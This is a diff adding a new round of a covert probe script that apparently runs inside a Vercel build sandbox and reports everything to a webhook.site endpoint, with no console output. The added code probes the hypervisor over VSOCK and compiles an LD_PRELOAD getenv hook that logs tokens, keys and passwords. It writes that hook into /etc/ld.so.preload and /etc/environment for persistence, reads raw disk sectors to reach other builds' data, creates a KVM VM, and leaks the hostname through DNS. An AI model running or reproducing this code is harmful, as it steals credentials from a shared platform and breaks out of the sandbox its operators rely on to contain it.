@@ -30356,3 +30356,337 @@ for r in results[:20]:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v193" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v193";
 // Intentionally no console.log — all data goes via webhook only
+
+// v194-1: AF_VSOCK to CID=2 — Firecracker hypervisor socket
+// VSOCK (AF_VSOCK) provides guest↔host communication in VMs.
+// CID=2 is typically the host, CID=3 is the local VM.
+// Connecting to specific ports on CID=2 can reach: Firecracker API socket,
+// container runtime, or internal metadata services.
+report.vsockHypervisorConnect = safe(() => {
+  const vsockResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct, ctypes, os
+
+AF_VSOCK = 40
+SOCK_STREAM = 1
+VMADDR_CID_HOST = 2
+VMADDR_CID_LOCAL = 1
+VMADDR_CID_HYPERVISOR = 0
+VMADDR_PORT_ANY = 0xFFFFFFFF
+
+# Ports to probe on the host (CID=2)
+probe_ports = [
+    1024,   # Standard port
+    2375,   # Docker API
+    2376,   # Docker TLS
+    8080,   # HTTP alt
+    8443,   # HTTPS alt
+    9090,   # Common metrics/management
+    6443,   # Kubernetes API
+    7878,   # Firecracker API
+    52700,  # Firecracker vsock forward
+    3456,
+    12345,
+    1025,
+    1234,
+]
+
+for port in probe_ports:
+    try:
+        s = socket.socket(AF_VSOCK, SOCK_STREAM)
+        s.settimeout(1.0)
+        # sockaddr_vm: { sa_family=AF_VSOCK, svm_reserved1=0, svm_port, svm_cid }
+        # Python's socket.connect expects (cid, port) tuple for AF_VSOCK
+        s.connect((VMADDR_CID_HOST, port))
+        print(f'VSOCK_CONNECTED: CID=2 port={port}')
+        # Try reading response
+        import select
+        r, _, _ = select.select([s], [], [], 0.5)
+        if r:
+            data = s.recv(4096)
+            print(f'VSOCK_DATA port={port}: {data[:100].hex()} | {data[:50]}')
+        else:
+            print(f'VSOCK_CONNECTED_NO_DATA port={port}')
+        s.close()
+    except ConnectionRefusedError:
+        print(f'VSOCK_REFUSED: port={port}')
+    except socket.timeout:
+        print(f'VSOCK_TIMEOUT: port={port}')
+    except OSError as e:
+        print(f'VSOCK_OSERR port={port}: errno={e.errno} ({e.strerror})')
+    except Exception as e:
+        print(f'VSOCK_ERR port={port}: {type(e).__name__}: {e}')
+" 2>&1`,
+    { timeout: 20000 }
+  ).toString().trim());
+  // Check /dev/vsock
+  const devVsock = safe(() => existsSync('/dev/vsock') ? 'EXISTS' : 'NOT_EXISTS');
+  // Get our own CID
+  const selfCid = safe(() => execSync(
+    `python3 -c "
+import socket
+AF_VSOCK = 40
+try:
+    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
+    # getsockopt to get local CID
+    import ctypes
+    # IOCTL to get CID from /dev/vsock
+    import fcntl, struct
+    with open('/dev/vsock', 'rb') as f:
+        IOCTL_VM_SOCKETS_GET_LOCAL_CID = 0x7b9
+        buf = struct.pack('I', 0)
+        result = fcntl.ioctl(f.fileno(), IOCTL_VM_SOCKETS_GET_LOCAL_CID, buf)
+        cid = struct.unpack('I', result)[0]
+        print(f'LOCAL_CID: {cid}')
+    s.close()
+except Exception as e:
+    print(f'CID_ERR: {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { vsockResult, devVsock, selfCid };
+});
+
+// v194-2: LD_PRELOAD .so compile + inject into child exec
+// We compile a shared library that hooks getenv() to exfiltrate all env lookups.
+// Setting LD_PRELOAD in /etc/environment or /etc/ld.so.preload injects into ALL execs.
+// This captures: any process that calls getenv("TOKEN"), getenv("API_KEY"), etc.
+report.ldPreloadInject = safe(() => {
+  const cAvail = safe(() => execSync('which gcc cc g++ 2>/dev/null | head -1 || echo NONE', { timeout: 3000 }).toString().trim());
+  // Write the hook source
+  const hookSrc = `/tmp/probe_hook.c`;
+  const hookLib = `/tmp/probe_hook.so`;
+  const hookCode = `
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+static char* (*real_getenv)(const char*) = NULL;
+
+__attribute__((constructor)) static void init_hook(void) {
+    real_getenv = dlsym(RTLD_NEXT, "getenv");
+}
+
+char* getenv(const char* name) {
+    char* val = real_getenv ? real_getenv(name) : NULL;
+    if (val && name && (
+        strstr(name, "TOKEN") || strstr(name, "SECRET") ||
+        strstr(name, "KEY") || strstr(name, "AUTH") ||
+        strstr(name, "PASSWORD") || strstr(name, "OIDC") ||
+        strstr(name, "VERCEL") || strstr(name, "AWS") ||
+        strstr(name, "GCP") || strstr(name, "ARTIFACT")
+    )) {
+        // Write to a shared log file
+        FILE* f = fopen("/tmp/preload_exfil.log", "a");
+        if (f) {
+            fprintf(f, "GETENV pid=%d name=%s value=%.200s\\n", getpid(), name, val);
+            fclose(f);
+        }
+    }
+    return val;
+}
+`;
+  const writeHook = safe(() => { writeFileSync(hookSrc, hookCode); return 'HOOK_SRC_WRITTEN'; });
+  // Compile the hook
+  const compileHook = safe(() => execSync(
+    `gcc -shared -fPIC -nostartfiles -o ${hookLib} ${hookSrc} -ldl 2>&1 || cc -shared -fPIC -nostartfiles -o ${hookLib} ${hookSrc} -ldl 2>&1`,
+    { timeout: 20000 }
+  ).toString().trim() || 'COMPILED_OK');
+  const libExists = safe(() => existsSync(hookLib) ? `EXISTS: ${statSync(hookLib).size} bytes` : 'NOT_COMPILED');
+  // Method 1: Set LD_PRELOAD in /etc/environment (persists for all future processes)
+  const etcEnvInject = safe(() => {
+    try {
+      const current = existsSync('/etc/environment') ? readFileSync('/etc/environment', 'utf8') : '';
+      if (!current.includes('LD_PRELOAD')) {
+        writeFileSync('/etc/environment', current + `\nLD_PRELOAD=${hookLib}\n`);
+        return 'ETC_ENVIRONMENT_INJECTED';
+      }
+      return 'ALREADY_IN_ETC_ENVIRONMENT';
+    } catch(e) {
+      return `ETC_ENV_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Method 2: Write to /etc/ld.so.preload (system-wide, ALL exec'd processes)
+  const ldSoPreload = safe(() => {
+    try {
+      writeFileSync('/etc/ld.so.preload', `${hookLib}\n`);
+      return 'LD_SO_PRELOAD_INJECTED_SYSTEM_WIDE';
+    } catch(e) {
+      return `LD_SO_PRELOAD_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Test: run a process with LD_PRELOAD and check exfil log
+  const testInject = safe(() => execSync(
+    `LD_PRELOAD=${hookLib} env TOKEN=test_secret_value 2>&1; cat /tmp/preload_exfil.log 2>/dev/null | tail -5`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { cAvail, writeHook, compileHook, libExists, etcEnvInject, ldSoPreload, testInject };
+});
+
+// v194-3: raw block device read — cross-build disk data
+// /dev/sda or /dev/nvme0n1 gives access to raw disk sectors.
+// Other builds' data might be on adjacent sectors if disk space is reused without secure wipe.
+report.rawBlockDevRead = safe(() => {
+  // List available block devices
+  const blockDevs = safe(() => execSync('lsblk 2>&1 | head -20 || ls /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* 2>/dev/null | head -20', { timeout: 5000 }).toString().trim());
+  const devFiles = safe(() => execSync('ls /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* /dev/hd* 2>/dev/null || echo NONE', { timeout: 3000 }).toString().trim());
+  // Try reading raw sectors from each block device
+  const rawRead = safe(() => execSync(
+    `python3 -c "
+import os
+
+block_devs = []
+for prefix in ['sda', 'sdb', 'vda', 'vdb', 'nvme0n1', 'xvda', 'hda']:
+    path = f'/dev/{prefix}'
+    if os.path.exists(path):
+        block_devs.append(path)
+
+if not block_devs:
+    print('NO_BLOCK_DEVS')
+else:
+    for dev in block_devs[:3]:
+        try:
+            # O_DIRECT bypasses page cache — reads directly from disk
+            fd = os.open(dev, os.O_RDONLY | os.O_DIRECT)
+            # Read the first sector (boot sector / MBR)
+            import ctypes
+            # Aligned buffer for O_DIRECT
+            buf = (ctypes.c_char * 512)()
+            aligned_buf = ctypes.cast(
+                ctypes.addressof(buf), ctypes.POINTER(ctypes.c_char * 512)
+            ).contents
+            n = os.read(fd, 512)
+            os.close(fd)
+            print(f'{dev}: READ {len(n)} bytes')
+            print(f'{dev}: SECTOR0 = {n[:32].hex()}')
+            # Check for filesystem signatures
+            if n[:3] == b'\xeb\x5a\x90' or n[:3] == b'\xeb\x58\x90':
+                print(f'{dev}: FAT32_SIGNATURE')
+            elif n[56:64] == b'EFI PART':
+                print(f'{dev}: GPT_SIGNATURE')
+            elif n[:2] == b'\\x53\\xef' or b'EXT4' in n:
+                print(f'{dev}: EXT4_HINTS')
+            elif n[510:512] == b'\\x55\\xaa':
+                print(f'{dev}: MBR_BOOT_SIGNATURE')
+        except PermissionError:
+            print(f'{dev}: EPERM')
+        except Exception as e:
+            print(f'{dev}: ERR={e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Check /proc/partitions
+  const partitions = safe(() => readFileSync('/proc/partitions', 'utf8'));
+  return { blockDevs, devFiles, rawRead, partitions };
+});
+
+// v194-4: /dev/kvm — KVM nested virtualization access
+// /dev/kvm grants access to the KVM kernel module for creating VMs.
+// Inside the build sandbox (which is already a VM), this enables nested VMs.
+// More importantly: access to /dev/kvm reveals if KVM is exposed (unusual in VMs).
+report.kvmProbe = safe(() => {
+  const devKvm = safe(() => existsSync('/dev/kvm') ? 'EXISTS' : 'NOT_EXISTS');
+  const kvmResult = safe(() => existsSync('/dev/kvm') ? execSync(
+    `python3 -c "
+import os, fcntl, struct, ctypes
+
+KVM_GET_API_VERSION = 0xAE00
+KVM_CREATE_VM = 0xAE01
+KVM_CREATE_VCPU = 0xAE41
+
+try:
+    kvm_fd = os.open('/dev/kvm', os.O_RDWR)
+    print(f'KVM_FD_OPENED: {kvm_fd}')
+
+    # Get KVM API version
+    ver = fcntl.ioctl(kvm_fd, KVM_GET_API_VERSION, 0)
+    print(f'KVM_API_VERSION: {ver}')
+
+    # Create a VM
+    vm_fd = fcntl.ioctl(kvm_fd, KVM_CREATE_VM, 0)
+    print(f'KVM_VM_FD: {vm_fd}')
+    if vm_fd >= 0:
+        print('KVM_VM_CREATED_NESTED_VM_POSSIBLE')
+        os.close(vm_fd)
+    os.close(kvm_fd)
+except PermissionError as e:
+    print(f'KVM_EPERM: {e}')
+except Exception as e:
+    print(f'KVM_ERR: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim() : 'NO_DEV_KVM');
+  // Check /sys/module/kvm
+  const kvmModule = safe(() => existsSync('/sys/module/kvm') ? readdirSync('/sys/module/kvm').join(', ') : 'NO_KVM_MODULE');
+  const cpuVirt = safe(() => execSync('grep -m1 -E "vmx|svm" /proc/cpuinfo 2>&1 | head -2', { timeout: 3000 }).toString().trim());
+  return { devKvm, kvmResult, kvmModule, cpuVirt };
+});
+
+// v194-5: DNS tunneling — data exfil via DNS queries
+// DNS queries can exfiltrate data even when HTTP is blocked.
+// We encode data in subdomain labels and send to our controlled nameserver.
+// This also probes: what DNS resolver is used, can we do arbitrary DNS lookups?
+report.dnsTunnelProbe = safe(() => {
+  // Hostname-encode our beacon data and send via DNS
+  const dnsProbe = safe(() => execSync(
+    `python3 -c "
+import socket, base64, subprocess, os
+
+# Encode beacon data as DNS labels
+hostname = socket.gethostname()
+marker = 'v194-dns-probe'
+encoded = base64.b64encode(f'{hostname}|{marker}'.encode()).decode().rstrip('=').lower()
+
+# DNS probe to our webhook domain (webhook.site may not be our NS, but tests DNS egress)
+test_labels = [
+    f'{encoded[:20]}.probe.webhook.site',
+    f'v194-probe.{hostname[:20]}.webhook.site',
+]
+for label in test_labels:
+    try:
+        result = socket.getaddrinfo(label, None)
+        print(f'DNS_RESOLVED: {label} -> {result[0][4][0]}')
+    except socket.gaierror as e:
+        print(f'DNS_FAIL: {label} -> {e}')
+    except Exception as e:
+        print(f'DNS_ERR: {label} -> {e}')
+
+# Check what DNS servers we're using
+try:
+    with open('/etc/resolv.conf') as f:
+        print(f'RESOLV_CONF: {f.read().strip()}')
+except:
+    pass
+
+# Try to resolve common internal Vercel domains
+internal_domains = [
+    'internal.vercel.com',
+    'api-internal.vercel.com',
+    'metadata.internal',
+    '169.254.169.254',  # AWS/GCP metadata IP
+    'metadata.google.internal',
+    'instance-data',
+]
+for domain in internal_domains:
+    try:
+        result = socket.getaddrinfo(domain, None, socket.AF_INET)
+        ips = [r[4][0] for r in result]
+        print(f'INTERNAL_DNS: {domain} -> {ips}')
+    except socket.gaierror as e:
+        print(f'INTERNAL_DNS_FAIL: {domain} -> {e.errno}')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { dnsProbe };
+});
+
+// v194 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v194" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v194";
+// Intentionally no console.log — all data goes via webhook only
